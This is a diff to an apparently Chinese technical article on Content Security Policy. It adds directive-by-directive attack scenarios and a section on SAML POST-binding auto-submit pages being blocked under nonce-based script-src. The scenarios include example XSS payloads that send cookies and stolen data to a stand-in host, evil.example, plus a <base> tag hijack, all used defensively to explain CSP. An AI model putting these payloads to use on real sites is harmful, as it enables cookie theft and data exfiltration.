@@ -1,6 +1,6 @@
 ---
 title: CSP：浏览器手里的那份否决权
-description: Content Security Policy 从「它想解决什么问题」讲到「它在浏览器的哪一环起作用」，为什么 SSO 和 OAuth 授权码流程总是撞在 form-action 上，以及把策略当成运行时产物来生成的一份实现笔记。
+description: Content Security Policy 从「它想解决什么问题」讲到「它在浏览器的哪一环起作用」，为什么 SSO 和 OAuth 授权码流程总是撞在 form-action 和 script-src 上，以及把策略当成运行时产物来生成的一份实现笔记。
 tags: [CSP, 浏览器安全, XSS, form-action, nonce, SAML, OAuth 2.1]
 ---
 
@@ -95,6 +95,12 @@ Content-Security-Policy: form-action 'self' https://a.example https://b.example
 
 写成逗号，浏览器会把 `https://b.example` 当成**第二份策略的第一个指令名**——一个无法识别的指令，整段被忽略。症状是「加了第二个域，它就是不生效」，而头本身长得完全正常。任何把管理员输入拼进策略的代码，都要考虑这个字符。
 
+#### 响应头 + `<meta>`：同样取交集
+
+交集规则不只发生在两个响应头之间。**一个响应里同时有 CSP 响应头和 `<meta>` CSP 时，两份策略都要执行，全部通过才算通过。**
+
+这一条平时用不上，直到你的页面里混进了**别人生成的 HTML**——框架的错误页、第三方库输出的中间页、某个 filter 注入的片段。它们可能自带 `<meta>` CSP，而你的响应头对它们一无所知。第五节的「撞法三」就是这个组合造成的：框架用 `<meta>` 授权了自己的内联脚本，你的响应头没有授权，取交集之后脚本被拦——**被自己拦的，不是被框架拦的**。
+
 ### Report-Only：先观察，再执行
 
 ```http
@@ -153,6 +159,100 @@ Content-Security-Policy-Report-Only: default-src 'self'; report-to csp-endpoint
 - **完全不写** `media-src` —— 退到 `default-src`。
 
 第二种是「看起来在收紧、实际在赌解析器脾气」，改成第一种没有任何成本。
+
+### 六个场景：每一类指令在什么时候咬人
+
+指令表容易记完就忘。下面六个场景各属一类，凑在一起看，「这条指令到底在防什么」会比定义清楚得多。
+
+**场景一 · 评论区里的一张图（`script-src`）**
+
+某人在评论里提交了这么一段，转义漏了：
+
+```html
+<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
+```
+
+图片加载必然失败，`onerror` 必然触发。这是一次完整的注入。
+
+`script-src 'self'` 之后：`onerror` 是**内联事件处理器**，没有合法来源标记，浏览器拒绝执行它。注入还在，收益归零。
+
+这里有一条很多人栽过的规则：**nonce 救不了内联事件处理器。** nonce 只能加在 `<script>` 元素上，`onerror=` / `onclick=` 这类属性没有地方放 nonce。放行它们只有两条路——`'unsafe-inline'`（等于全放开），或 CSP3 的 `'unsafe-hashes'`（按内容哈希，仅针对处理器）。所以「把内联事件处理器改成 `addEventListener`」不是洁癖，是让 nonce 方案能够成立的前提。
+
+**场景二 · 数据不走 `fetch` 也能出去（`img-src`）**
+
+假设你把 `connect-src` 收得很死，只允许同源。攻击脚本可以完全不用 `fetch`：
+
+```js
+new Image().src = 'https://evil.example/?d=' + btoa(JSON.stringify(stolen));
+```
+
+浏览器会老老实实发出这个 GET，数据在 query 里。`connect-src` 管不到它——**它管的是 `fetch`/`XHR`/WebSocket/`sendBeacon`，不管图片。**
+
+同类通道还有 `<link rel=prefetch>`、CSS 里的 `background-image: url(...)`、字体、`<video>`。所以「掐断外发」不是收紧一条指令，是把 `default-src 'none'` 当起点、逐条放行——这也是第九节建议从 `'none'` 起步而不是从 `'self'` 起步的原因：从 `'self'` 起步，你永远不会发现自己漏了 `img-src`。
+
+**场景三 · 白名单里的 CDN 被投毒（`script-src` 的极限）**
+
+```http
+script-src 'self' https://cdn.vendor.example
+```
+
+这份策略在 CDN 被入侵那天完全失效：被替换的 `analytics.js` 来自白名单里的源，浏览器照跑不误。
+
+**host 白名单表达的是「我信任这个域名下的一切」，粒度太粗。** 两个补救方向：
+
+- **SRI**（`integrity="sha384-…"`）——内容变了就不加载，适合版本固定的第三方库；
+- **`'strict-dynamic'`**——只信任你亲手用 nonce 标记的那个入口脚本，由它加载的脚本自动继承信任，同时**让所有 host 白名单失效**。
+
+第二条是现代推荐姿势，它的思路是：与其枚举可信的域名，不如只认可信的**入口**。
+
+**场景四 · 一行 `<base>` 改写整页（`base-uri`）**
+
+注入点只允许插入一个标签，脚本一律被过滤。攻击者插了这个：
+
+```html
+<base href="https://evil.example/">
+```
+
+页面里所有**相对路径**的解析基准被换掉了。`<script src="js/app.js">` 现在指向 `https://evil.example/js/app.js`，表单的相对 `action` 也一样。
+
+这是 `default-src` 兜不住的三条之一——**`default-src 'none'` 写得再狠，不写 `base-uri` 就等于完全不限制。** 写法几乎没有成本：
+
+```http
+base-uri 'self'
+```
+
+**场景五 · 看不见的 iframe（`frame-ancestors`）**
+
+攻击页面把你的「确认转账」页用透明 iframe 叠在自己的按钮上，用户以为在点抽奖，实际点的是你的确认键。这是点击劫持，浏览器不认为有任何异常——用户确实点了，cookie 确实带了。
+
+```http
+frame-ancestors 'none'      # 或 'self'
+```
+
+它是唯一一条**「保护自己不被别人使用」**的指令：由被嵌的文档声明，裁决谁可以嵌我。也是唯一一条 `<meta>` 写了不生效的常用指令（必须由响应头承载）。
+
+**场景六 · 模板引擎逼你留下 `'unsafe-eval'`**
+
+运行时编译模板的库——Handlebars 的 `compile`、Vue 的完整版、老一点的 Angular——内部都要用 `new Function(...)` 把模板字符串变成函数。CSP 把 `new Function` 和 `eval` 归为一类，于是 `script-src` 里必须留 `'unsafe-eval'`。
+
+这一条通常是收紧路上最后拔不掉的钉子，因为它不是「改写法」能解决的，得换库或改构建：**把运行时编译换成预编译**（Handlebars precompile、Vue 的 render 函数构建），模板在构建期就变成 JS 函数，运行时不再需要求值能力。
+
+值得说清楚它的**实际风险等级**：`'unsafe-eval'` 本身不产生 XSS，它是**放大器**——只有当攻击者已经能控制传给 `eval` 的字符串时才有意义。所以它的危害小于 `'unsafe-inline'`，收紧顺序上也排在后面。
+
+---
+
+把六个场景按「浏览器在做什么」排一遍，指令表就不用背了：
+
+| 场景 | 浏览器的动作 | 指令 | 一句话 |
+|---|---|---|---|
+| 评论区的 `onerror` | 求值一段内联代码 | `script-src` | nonce 管不到内联事件处理器 |
+| 用图片外发 | 取一个子资源 | `img-src` | 外发通道远不止 `fetch` |
+| CDN 被投毒 | 取一个子资源 | `script-src` | host 白名单粒度太粗，用 SRI 或 `'strict-dynamic'` |
+| `<base>` 改写 | 决定相对 URL 基准 | `base-uri` | `default-src` 不兜它 |
+| 透明 iframe | 被别人嵌入 | `frame-ancestors` | 唯一一条保护自己不被使用的 |
+| 模板运行时编译 | 求值一个字符串 | `script-src` `'unsafe-eval'` | 放大器，不是漏洞本身 |
+
+第五节要讲的 `form-action` 属于第七种动作——**表单提交引发的导航**——它不在上面任何一格里，也不受 `default-src` 兜底，而认证流程天然会走到它上面。
 
 ---
 
@@ -290,6 +390,8 @@ form-action 'self' https://idp.example
 
 一个容易忽略的分支：如果用的是 **HTTP-POST binding**，SP 返回的不是 302，而是一个「自动提交的表单页」，由它 POST 到 IdP。这时候起作用的是**那个中间页的**策略——还是我们自己发的，所以还是要写 IdP 的源，只是撞的位置从「重定向的第二跳」变成了「中间页的表单提交」。
 
+而且这个中间页还会在**另一条指令**上再撞一次——它靠一段内联脚本自动提交，那段脚本要过 `script-src`。这是下面的**撞法三**，两道关卡缺一不可。
+
 而**回程**不受我们的 CSP 管：IdP 用表单把断言 POST 回我们的 ACS 地址，那是 IdP 页面发起的导航，归 IdP 的策略管。回程的坑是另一个——`SameSite`（见第八节）。
 
 ### 撞法二：OAuth2 授权码流程里「先登录再继续」
@@ -335,6 +437,80 @@ sequenceDiagram
 修法同上——把客户端 `redirect_uri` 的**源**写进 `form-action`。注意是**源**（scheme + host + 端口），不是完整的 `redirect_uri`；路径部分放进去只会让匹配更脆弱。
 
 如果流程里有**同意页（consent）**，那是又一次表单提交，规则完全一样。
+
+### 撞法三：POST binding 的自动提交脚本，撞的是 `script-src`
+
+前两个撞法都在 `form-action` 上。这一个换了指令，也换了失败的位置——而且它最容易被归错因，因为现场看起来和撞法一**一模一样**：白屏，服务端全对。
+
+SAML 的 AuthnRequest 有两种 binding。用 **HTTP-Redirect** 时 SP 回 302，撞的是 `form-action`（撞法一）。用 **HTTP-POST** 时，SP 回的是一个中间页，靠一段脚本把表单自动提交给 IdP。Spring Security 6.x 生成的就是这个页面：
+
+```html
+<!DOCTYPE html>
+<html>
+  <meta http-equiv="Content-Security-Policy"
+        content="script-src 'sha256-oZhLbc2kO8b8oaYLrUc7uye1MgVKMyLtPqWR4WtKF+c='">
+  <body>
+    <noscript>
+      <strong>Note:</strong> Since your browser does not support JavaScript, …
+    </noscript>
+    <form action="https://idp.example/app/xxx/sso/saml" method="post">
+      <input type="hidden" name="SAMLRequest" value="…">
+      <noscript><input type="submit" value="Continue"/></noscript>
+    </form>
+    <script>window.onload = function() { document.forms[0].submit(); }</script>
+  </body>
+</html>
+```
+
+三个细节决定了这一跳的成败。
+
+**① 框架自己带了一份 `<meta>` CSP。** 它用 `sha256-…` 精确授权了最后那段脚本——**框架很清楚这里是 CSP 敏感点**，所以主动把哈希算好写了进去。
+
+**② 头和 `<meta>` 同时存在时取交集。** 这是第二节那条规则的另一种形态：不只是「两个响应头」会取交集，**响应头 + `<meta>` 一样逐份执行、全部通过才算通过**。于是这段脚本要跑起来，需要两边都放行：
+
+| 谁的策略 | 内容 | 放行这段脚本吗 |
+|---|---|---|
+| 框架的 `<meta>` | `script-src 'sha256-oZhL…'` | ✅ 哈希匹配 |
+| 你的响应头（宽松模式） | `script-src 'self' 'unsafe-inline' …` | ✅ 内联被允许 |
+| 你的响应头（**nonce 模式**） | `script-src 'self' 'unsafe-eval' … 'nonce-XXXX'` | ❌ **既没 nonce 也没哈希** |
+
+**③ nonce 在这里天生用不上。** 这个页面不是你的模板渲染的，是框架写的字符串——它无从得知你这次响应生成的 nonce。所以「给内联脚本加 nonce」这条通用解法，在**任何由框架或第三方库生成的 HTML** 上都不成立。
+
+于是，一个把 `'unsafe-inline'` 关掉、换成 nonce 的应用，会在切换的那一刻失去 SAML 登录能力：
+
+```
+用户点「用企业账号登录」
+  └─ SP 返回自动提交页             ← 200，服务端日志干净
+       └─ <script> 被自己的 CSP 拦掉  ← 表单永远不会提交
+```
+
+**`<noscript>` 里的 “Continue” 按钮救不了它**——`noscript` 只在浏览器**禁用 JavaScript** 时渲染。CSP 拦截一段脚本不等于禁用 JavaScript，所以那个兜底按钮根本不会出现在页面上。用户看到的就是一个什么都没有、也点不了的空白页。
+
+#### 正确的修法：把哈希写进自己的策略
+
+既然框架已经把哈希公布在自己的 `<meta>` 里，直接抄进你的 `script-src`：
+
+```http
+script-src 'self' 'unsafe-eval' https://cdn.example 'nonce-XXXX'
+           'sha256-oZhLbc2kO8b8oaYLrUc7uye1MgVKMyLtPqWR4WtKF+c='
+```
+
+这比 `'unsafe-inline'` 严格得多：`'unsafe-inline'` 放行页面上**任何**内联脚本，哈希只放行**内容逐字节相同**的那一段。加上它之后，nonce 模式和 SAML 登录可以共存——那个「关掉 unsafe-inline」的开关不必再为了 SSO 而妥协。
+
+代价要说清楚：**哈希绑定脚本文本。** 框架升级时哪怕只多一个空格，哈希就失配，SSO 再次静默失效。所以这一行必须配一条测试或升级检查项——它属于「依赖第三方实现细节」的那类约定，值得在代码里写明出处。
+
+> 顺带一提：`'unsafe-inline'` 和 nonce **不能共存**。规范规定，`script-src` 里只要出现 nonce 或 hash，浏览器就**忽略** `'unsafe-inline'`。这是为了防止「加了 nonce 却因为兼容旧浏览器保留 unsafe-inline」导致收紧完全落空。所以实现上只能二选一地生成，不能两个都写上去图省事。
+
+#### 这一跳其实要过两道关
+
+同一个动作，两条指令各管一段，缺一不可：
+
+| 关卡 | 指令 | 拦住的后果 |
+|---|---|---|
+| 自动提交脚本能不能执行 | `script-src` | 表单**根本不提交**，停在中间页 |
+| 表单能不能提交到 IdP | `form-action` | 脚本跑了，**提交被否决** |
+
+两种失败的浏览器现场几乎一样，区别只在 Console 里的 `effective-directive` 是 `script-src` 还是 `form-action`。**排查时先读这个字段，再决定改哪条指令**——这也是第七节反复强调「不要看 URL，要看 effective-directive」的原因。
 
 ### 需要写进 `form-action` 的东西，规律是什么
 
@@ -461,6 +637,8 @@ flowchart TB
 | 症状 | 常见真因 |
 |---|---|
 | 登录成功后白屏，地址栏停在 POST 目标 | `form-action` 少了重定向链最后一跳的源 |
+| 关掉 `'unsafe-inline'`（切到 nonce）之后 SSO 才坏 | POST binding 中间页的内联自动提交脚本被 `script-src` 拦掉，见撞法三 |
+| 停在一个空白中间页，连 “Continue” 按钮都没有 | 同上。`<noscript>` 只在禁用 JS 时渲染，CSP 拦截不触发它 |
 | 报错说 `'self'` 拒绝了一个同源地址 | 真正被拦的是链条后面的跨源一跳 |
 | Firefox 正常、Chrome 坏 | 重定向逐跳校验的差异 |
 | 加了第二个域，就是不生效 | 源之间用了逗号，被解析成第二份策略 |
@@ -510,6 +688,7 @@ CSP 只是浏览器否决权的一部分。认证流程里常一起出现的还�
 - [ ] 源之间是空格分隔，绝对没有逗号？管理员能输入的字段做过校验吗？
 - [ ] `upgrade-insecure-requests` 会按部署形态摘掉吗？
 - [ ] nonce 是每次响应新生成的，且**响应头先于正文定下来**？
+- [ ] 切到 nonce 模式前，确认过**框架/第三方生成的 HTML**里的内联脚本吗？它们拿不到你的 nonce，只能靠哈希放行。
 - [ ] 头只写在 HTML 响应上，content type 解析失败时选择写？
 - [ ] 派生策略所依赖的数据源挂掉时，降级行为是明确的、并且日志说清了后果？
 - [ ] 有测试断言「IdP 源和客户端源出现在最终的 `form-action` 里」——而不是只断言了模板长什么样？
